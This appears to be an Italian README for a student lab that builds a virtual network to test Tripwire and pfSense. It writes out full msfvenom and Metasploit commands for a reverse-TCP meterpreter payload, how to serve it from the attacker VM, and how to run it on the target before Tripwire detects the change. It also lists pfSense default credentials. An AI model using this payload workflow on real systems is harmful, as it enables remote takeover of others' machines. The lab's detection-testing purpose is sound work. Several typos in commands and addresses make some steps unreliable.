

# ProjectAdvancedCybersecurity
Il seguente repository ha lo scopo di illustrare come configurare una rete di macchine virtuali, al fine di testare alcuni software legati alla sicurezza informatica. L' architettura viene riportata in figura.

![Architettura](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Screened-Network.drawio.png)

Le macchine virtuali sono le seguenti: 
 - **Target**: Ubuntu 22.04.2 LTS (con installato *Tripwire*)
 - **Attacker**: Kali 2023.1 (con installato *python3*)
 - **Firewall**: Pfsense 2.6.0 (con i pacchetti *Squid* e *Snort*)

Per quest'attività è stata configurata una rete interna a VirtualBox: `192.168.56.0 /24` separata da quella domestica: `192.168.1.0 /24`.
Per fare ciò sono state configurate inizialmente le schede di rete virtuali delle macchine, queste in sostanza implementano un dispositivo fisico emulato dal software. La configurazione è la seguente: 

 - **Target**: una scheda di rete connessa alla rete interna (con alias "*intnet*")
 - **Kali**: una scheda di rete connessa alla rete interna (con alias "*intnet*")
 - **Pfsense**: una scheda di rete connessa alla rete interna (con alias "*intnet*"); un'altra in modalità bridge (questa creerà un virtual switch che ci permetterà di uscire dalla"*intnet*" passando per il router domestico)

Successivamente sono state assegnati staticamente gli indirizzi IPv4 alle interfacce come segue:
|VM  |IPv4 | Subnet Mask | Gateway |
|--|--|--|--|
| `Kali` | `192.168.56.101` | `255.255.255.0` | `192.168.56.100`
| `Ubuntu`| `192.168.56.2`  | `255.255.255.0` | `192.168.56.100`
| `Pfsense`| `192.168.56.100` | `255.255.255.0` | -
 
Facendo ciò è stata implementata una rete fedele all'architettura mostrata sopra. 
Di seguito verranno esplicitati tutti i passi di configurazione e simulazione di due diversi scenari: uno per testare tripwire e un'altro per testare il firewall (con i suoi pacchetti)
> Nota: nel repository si trovano le macchine con questa configurazione
# Scenario 1 
Il primo scenario ha l'obiettivo di testare Tripwire, sottoponendo la macchina `Ubuntu` ad un attacco di *reverse shell TCP* da parte della macchina `Kali`.
## Kali Attacker
Per effettuare l'attacco la macchina `Kali` necessita di avere installato python3. 
```bash
sudo  apt update &&  sudo  apt upgrade -y
```
```bash
sudo apt install python3
```
Fatto ciò si può procedere all'attacco avvalendosi del framework *Metasploit*. Aprire 4 terminali:

**1° Terminale**: Ottenere indirizzo ip dell'interfaccia di rete della macchina `Kali`:
 ```bash
ifconfig
```
 
 **2° Terminale**: Creare il pacchetto malevolo (eseguibile):
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f elf -o Desktop/payloads/shell-x86.elf
```
Dove i parametri:

-   _msfvenom_: il nome del programma principale metasploit;
-   _-p_: il payload da inserire. Può essere uno scritto da noi o, più comodamente, uno già presente in Metasploit (come in questo caso);
-   _LHOST_: l'indirizzo IP al quale l'app infettata si connetterà. Può essere un indirizzo locale come un indirizzo esterno;
-   _LPORT_: la porta da utilizzare;
-  _-f_: formato del pacchetto;
-   _-o_: il percorso dove andremo a salvare l'applicazione ricompilata, contenente il payload;

 **3° Terminale**: Ora tramite metaspoilt avvieremo l'*handler* che attenderà l'instaurazione di una *Meterpeter session* verso il `target`
```bash
msfconsle
```
Una volta aperta la console:
```bash
msf6> use multi/handler
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.56.101
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit

[*] Started reverse handler on 192.168.56.101:4444
[*] Starting the payload handler...
```
Una volta che la vittima avrà installato ed eseguito il file *.elf*  verrà aperta una sessione con una reverse shell che permetterà alla macchina `Kali` di infettare il `target`. Come esempio è stato eseguito un cambio di permessi ad una cartella:
 ```bash
meterpreter > sudo chmod o+x ./Target
```

 **4° Terminale**: Per far ricevere il pacchetto alla macchina target viene esposto un web server al quale sarà possibile scaricare il file *shell-x86.elf*. (prima entrare nella cartella in cui è il file):
```bash
cd Desktop/payloads
sudo python -m http.server 80
```

## Ubuntu Target
Nella macchina `target` la prima cosa da fare è installare Tripwire che ci permetterà di rilevare l'attacco compiuto dall'attaccante:
```bash
sudo apt-get update
sudo apt-get install tripwire
```
Lasciando inalterate le impostazioni di default, Tripwire ti chiederà di creare due chiavi:

-   **site key** : questa chiave viene utilizzata per proteggere i file di configurazione. Dobbiamo assicurarci che i file di configurazione non vengano modificati, altrimenti non ci si può fidare del nostro intero sistema di rilevamento. 
    
-   **local key** : questa chiave viene utilizzata su ogni macchina per eseguire i binari. Ciò è necessario per garantire che i nostri file binari non vengano eseguiti senza il nostro consenso.

>  Nota: assicurati di scegliere passphrase non facilmente deducibili

 ### 1. Inizializzare il database 
----------

Il primo step è inizializzare il database che tripwire utilizzerà per convalidare il sistema. Questo utilizza il file delle policy e controlla i punti specificati all'interno. Poiché il file di default non è stato ancora personalizzato per il nostro sistema, avremo molti avvisi, falsi positivi ed errori. Per inizializzare il database eseguire:

```bash
sudo tripwire --init
```

Questo creerà il nostro file di database e genererà dei *warnings* che dobbiamo regolare nella configurazione.  Eseguire il comando `check` e posizionare l'output in un file chiamato `test_results` contenuto nella nostra directory di configurazione di tripwire (`etc/tripwire`):

```bash
cd /etc/tripwire
sudo sh -c 'tripwire --check | grep Filename > test_results'
```

In esso saranno elencati tutti i file che avevano generato i *warnings* precedenti 

```bash
less /etc/tripwire/test_results
```
```bash
Filename: /etc/rc.boot
Filename: /root/mail
Filename: /root/Mail
Filename: /root/.xsession-errors
. . .
```
 ### 2. Configurazione file delle policy 
----------

Ottenuto questo elenco si deve esaminare il file di policy e modificarlo per eliminare questi falsi positivi. Aprire il file *twpol.txt* nell' editor con i privilegi di root:
```bash
sudo nano /etc/tripwire/twpol.txt
```
Eseguire una ricerca per ciascuno dei file restituiti in`test_results`, commentando tutte le righe che corrispondenti. Fatto ciò, creare una nuova regola, dandogli un nome e un livello di gravità:

 - `rulename =  "Detect Change permission"`;
 -   `severity = $(SIG_HI)`.
 
 Nel corpo verranno indicate directory e file, ai quali verrà applicata la regola `$(SEC_INVARIANT) (recurse = 0)`: non sono tollerati cambi di permessi/proprietà nel primo livello della directory.

![rule](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Tripwire%20rule.png)

Salvato e chiuso il file è configurato. Successivamente si dovrà ricreare il file di policy crittografato che tripwire effettivamente leggerà:

```bash
sudo twadmin -m P /etc/tripwire/twpol.txt
```
Dopo che questo è stato creato, dobbiamo inizializzare nuovamente il database per implementare la nostra politica:

```bash
sudo tripwire --init
```
```
Please enter your local passphrase:
Parsing policy file: /etc/tripwire/tw.pol
Generating the database...
*** Processing Unix File System ***
Wrote database file: /var/lib/tripwire/tripit.twd
The database was successfully generated.
```

> Nota: se i *warings* persistono rieseguire la procedura con i file indicati  

 ### 3. Predisposizione all'attacco
----------
Per far si che la macchina `target` subisca l'attacco è necessario scaricare l'eseguibile esposto dalla macchina `Kali` attraverso il web server. Dunque, collegandosi all'indirizzo `192.128.56.101` tramite un qualsiasi browser è possibile scaricare il file ed eseguirlo tramite i seguenti comandi: 
```bash
sudo chmod +x ./shell-x86.elf ##Concediamo diritti per esecuzione
./shell-x86.elf ##Esecuzione
```
Fatto ciò la macchina sarà infetta. Una volta che la macchina `Kali` avrà cambiato i permessi della cartella `./Target` sarà possibile iniziare la procedura di verifica:
```bash
sudo tripwire --check 
```
 la quale restituisce il seguente report di output:

![report](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Tripwire%20detect.png)

# Scenario 2
Il primo scenario ha l'obiettivo di testare Pfsense, più esplicitamente: 

 - i pacchetti `squid` , `squidGuard` e `snort`
 - le regole del firewall

## Pfsense 
L'ultimo componente da inserire all'interno della reta sarà Pfsense, un distribuzione firewall open-source basata sul sistema operativo FreeBSD.Per creare l'istanza della macchina scaricare il file ISO al seguente link https://www.pfsense.org/download/. Una avviata e configurata la macchina (opzioni di default), il primo step da affrontare è quello di impostare un nuovo indirizzo IP all'interfaccia di rete LAN. In generale, l'indirizzo che viene attribuito può essere quello del router domestico (es: 192.168.1.1) o potrebbe non essere impostato. Dunque per impostarne uno manualmente (es: 192.168.56.100) basterà attivare il menù dedicato tramite il tasto `2`

![pfsensemenu](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Pfsense%20menu.png)

 
  ### 1. Configurazione 
----------
Dalla macchina  `Ubuntu` attraverso un qualsiasi web browser sarà possibile accedere alla GUI per la configurazione di Pfsense (`http://192.168.58.100`) inserendo le credenziali di default: 

 - **Username**: *admin*
 - **Password**: *pfsense*

## Autori

- [Mattia Scuriatti](https://github.com/Me77y99)
- [Gatti Giada](https://github.com/S1090231)

